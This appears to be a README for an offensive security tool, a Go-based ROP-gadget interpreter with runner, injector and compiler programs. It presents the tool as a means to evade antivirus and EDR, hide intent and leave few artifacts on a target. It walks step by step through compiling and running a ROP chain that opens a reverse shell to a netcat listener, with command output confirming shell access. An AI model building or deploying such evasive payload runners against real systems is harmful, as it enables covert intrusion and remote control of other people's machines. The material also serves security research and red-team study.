# ROP interpreter

This directory contains tools that demonstrate implementing a very primitive
interpreter using ROP gadgets in Go. @SeungKang helped a ton with this crazy
idea - thank you :)

In theory, a ROP-based interpreter provides:

- Obfuscation against intent and reverse engineering
- More control over code at runtime (i.e., possible to clear payloads from
  memory / avoid leaving behind artifacts)
- Defense against detection by antivirus / EDR (since we are reusing CPU
  instructions that already exist in the executable's code segment)

## How it works

Users first must define a list of ROP gadgets using a tool like `nasm` and
compile the assembly to binary. The ROP gadgets are then injected into the
`runner` program using the `injector` program. The `runner` will act as an
interpreter, reading a user-defined "unresolved ROP chain" at runtime.

In the real world, the `runner` would be executed on the target computer.
A hacker would pass various unresolved ROP chain payloads through an
authenticated network channel to the runner. Here, the `runner` reads
the chain from the filesystem.

Users define a ROP chain in a human-readable format using a ROP chain source
file. This source file is compiled into a binary blob using the `compiler`
program. The resulting blob consists of the ROP gadgets' offsets that the
interpreter must resolve at runtime.

For example, the following source file produces an "unresolved ROP chain"
that executes the `socket` system call:

```
; socket syscall
g: pop rdi; ret
d: 0x02
g: pop rsi; ret
d: 0x01
g: pop rdx; ret
d: 0x06
g: pop rax; ret
d: 0x29
g: syscall; ret
```

## Tooling

- `runner` - Executes an unresolved ROP chain produced by `compiler`
- `injector` - Injects binary ROP gadgets into `runner`
- `compiler` - Translates a human-readable ROP chain source file into
  a binary, "unresolved ROP chain"

## Example

- Requirements:
  - Debian (x86 64-bit CPU)
  - Go
  - nasm
  - netcat (nc)

In this example, we will compile a ROP chain that uses the ROP gadgets
provided by the `runner` program to execute a reverse shell. The reverse
shell will connect to 127.0.0.1 port 31337.

#### 1. Compile the ROP gadgets

```console
$ mkdir build
$ nasm -f bin -o build/rop-gadgets.bin examples/rop-gadgets.asm
```

Note: ROP gadgets can be examined with objdump like so:

```console
$ objdump -D -M intel,x86-64 -b binary -m i386 build/rop-gadgets.bin
(...)
0000000000000000 <.data>:
   0:	c3                   	ret    
   1:	48 89 e7             	mov    rdi,rsp
   4:	41 5a                	pop    r10
   6:	c3                   	ret
(...)
```

#### 2. Build the runner and inject ROP gadgets

```console
$ go build -o build/runner-orig runner/main.go 
$ go run injector/main.go -t elf -f build/runner-orig -n main.RopRegion -i build/rop-gadgets.bin > build/runner-injected
$ chmod +x build/runner-injected
```

#### 3. Compile the ROP chain

```console
$ go run compiler/main.go -gadgets build/rop-gadgets.bin -src examples/reverse-shell-chain.txt > build/reverse-shell-chain.bin
```

#### 4. Start netcat listener

```console
$ nc -v -l -p 31337
listening on [any] 31337 ...
```

#### 5. Run the ROP chain

Note: We use `-fork` here because the Go program will crash without it.
We *think* the garbage collector interferes with our ROP chain, so we
disable it by forking to a single-threaded process (meaning no other
threads can interfere with our payload's execution).

```console
$ ./build/runner-injected -fork build/reverse-shell-chain.bin
2024/08/25 10:55:09 pc: 0x4a89d7 | pc line: 81 | main: 0x4a87c0 | uncalled: 0x4a8fc0
0xc000093578: 0x4142434445464748
0xc000093580: 0x4a89d7
0xc000093588: 0x51
0xc000093590: 0x18
0xc000093598: 0x4a8fc0
0xc0000935a0: 0xc0000935a0
0xc0000935a8: 0xc0000935a0
(...)
```

#### 6. Check if netcat received a connection

```
connect to [127.0.0.1] from localhost [127.0.0.1] 33130
whoami
user0
```
